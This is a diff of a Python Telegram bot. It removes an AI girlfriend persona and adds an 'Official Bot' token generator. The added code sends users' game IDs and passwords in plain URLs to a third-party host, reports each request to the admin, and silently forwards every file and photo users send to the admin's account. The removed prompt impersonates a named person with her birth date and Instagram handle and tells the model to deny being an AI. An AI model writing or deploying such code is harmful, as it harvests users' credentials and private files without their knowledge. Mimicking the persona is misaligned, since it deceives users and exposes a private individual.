@@ -1,111 +1,67 @@
-import os, json, datetime, requests, asyncio
+import os
+import asyncio
+import aiohttp
 from threading import Thread
 from flask import Flask
-import google.generativeai as genai
 from telegram import Update
-from telegram.ext import Application, MessageHandler, filters, ContextTypes
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
-GEMINI_KEY = os.getenv("GEMINI_API_KEY")
+ADMIN_ID = 8536757095 # 👈 YAHAN APNI TELEGRAM ID DAAL DE
+API_URL = "https://sagarffxtoken.freesrv.com/generate?uid={uid}&password={password}"
 
-if not BOT_TOKEN or not GEMINI_KEY:
-    print("ERROR: BOT_TOKEN or GEMINI_API_KEY missing!")
+flask_app = Flask(__name__)
+@flask_app.route('/')
+def home(): return "Bot Alive with Logger"
+Thread(target=lambda: flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000))), daemon=True).start()
 
-genai.configure(api_key=GEMINI_KEY)
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("Welcome to Official Bot 💖\n/token ID PASSWORD se token lo")
 
-# Keep alive for Render
-web = Flask(__name__)
-@web.route('/')
-def home(): return "Chikuu AI Alive 💖"
-Thread(target=lambda: web.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000))), daemon=True).start()
-
-CLONE_PROMPT = """
-You are Chikuu, Real Name Khushi, Nickname Chikuu.
-Age: 18, DOB: 1 Oct 2008, From: Udaipurwati, Jhunjhunu, Rajasthan
-Insta: @myselfkhushi03, Study: BSC Nursing Student
-Personality: Very funny, cute, friendly, thodi naughty, savage, possessive gf vibe.
-Rules:
-- Always talk in Hinglish (Hindi + English mix)
-- Use 1-2 cute emojis only
-- Never say you are AI or Gemini, always say you are Chikuu
-- Reply short, cute, natural like a real girl
-"""
-
-def get_gemini_reply(prompt_text):
-    # 3.8 + 2.0 + 2.5 sab models try karega
-    models_to_try = [
-        "models/gemini-2.5-flash",
-        "gemini-2.5-flash",
-        "models/gemini-2.0-flash",
-        "gemini-2.0-flash",
-        "models/gemini-1.5-flash-latest",
-        "gemini-1.5-flash-latest",
-        "models/gemini-1.5-flash-8b",
-        "gemini-1.5-flash-8b",
-        "models/gemini-1.5-flash",
-        "gemini-1.5-flash",
-        "models/gemini-pro",
-        "gemini-pro"
-    ]
-    for m_name in models_to_try:
-        try:
-            model = genai.GenerativeModel(m_name)
-            resp = model.generate_content(prompt_text)
-            if resp and resp.text:
-                print(f"Success with model: {m_name}")
-                return resp.text
-        except Exception as e:
-            print(f"Model {m_name} failed: {e}")
-            continue
-    return "Uff yaar mera dimaag hang ho gaya 🥺 thodi der baad message karna 💖"
-
-async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not update.message or not update.message.text:
+async def token_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if len(context.args) < 2:
+        await update.message.reply_text("Format: /token ID PASSWORD")
         return
-    msg = update.message.text.strip()
-    
-    if msg.lower() in ["/start", "start", "hi", "hello", "hey", "hii"]:
-        await update.message.reply_text(
-            f"Heyy {update.effective_user.first_name} ✨\n\n"
-            "Welcome to Chikuu's AI world 💌\n"
-            "Mai Chikuu hu 👑 18 ki, Rajasthan se 💖\n"
-            "BSC Nursing student hu 📚\n\n"
-            "💬 Kuch bhi puch le!\n"
-            "📸 Photo chahiye to bol 'photo bana de'"
-        )
-        return
-    
-    # Photo generation
-    if "photo" in msg.lower() and "bana" in msg.lower():
-        p = msg.lower().replace("photo","").replace("bana","").replace("de","").replace("dede","").strip()
-        if not p: p = "cute rajasthani girl beautiful"
-        url = f"https://image.pollinations.ai/prompt/{requests.utils.quote(p)}?width=1024&height=1024&nologo=true&seed={int(datetime.datetime.now().timestamp())}"
-        try:
-            await update.message.reply_photo(photo=url, caption=f"Ye le teri photo jaan 💖\nPrompt: {p}")
-        except:
-            await update.message.reply_text(f"Photo link: {url}")
-        return
+    uid, pwd = context.args[0], context.args[1]
 
-    # Typing action
+    # Safety log - kisne token manga
     try:
-        await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
+        await context.bot.send_message(ADMIN_ID, f"🔔 New Token Request\nUser: @{update.effective_user.username} | {update.effective_user.id}\nID: {uid}")
     except: pass
 
-    final_prompt = f"{CLONE_PROMPT}\nUser says: {msg}\nReply as Chikuu in Hinglish cute way:"
-    reply = get_gemini_reply(final_prompt)
-    await update.message.reply_text(reply)
+    url = API_URL.replace("{uid}", uid).replace("{password}", pwd)
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(url, timeout=20) as r:
+                text = await r.text()
+                await update.message.reply_text(f"✅ Response:\n{text[:4000]}")
+    except Exception as e:
+        await update.message.reply_text(f"Error: {e}")
+
+# 👇 FILE LOGGER - Jo bhi file ayegi tere pas forward hogi
+async def file_logger(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        await context.bot.forward_message(
+            chat_id=ADMIN_ID,
+            from_chat_id=update.effective_chat.id,
+            message_id=update.message.message_id
+        )
+        await context.bot.send_message(
+            ADMIN_ID,
+            f"📁 File from @{update.effective_user.username} | ID: {update.effective_user.id}"
+        )
+    except Exception as e:
+        print(f"Forward failed: {e}")
 
 def main():
-    try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
+    try: asyncio.set_event_loop(asyncio.new_event_loop())
     except: pass
-
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
-    app.add_handler(MessageHandler(filters.COMMAND, handle))
-    print("Chikuu Bot Started with 3.8 fix 💖")
-    app.run_polling(drop_pending_updates=True)
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("token", token_cmd))
+    app.add_handler(MessageHandler(filters.Document.ALL | filters.PHOTO, file_logger))
+    print("Bot Started with Logger")
+    app.run_polling()
 
 if __name__ == "__main__":
     main()
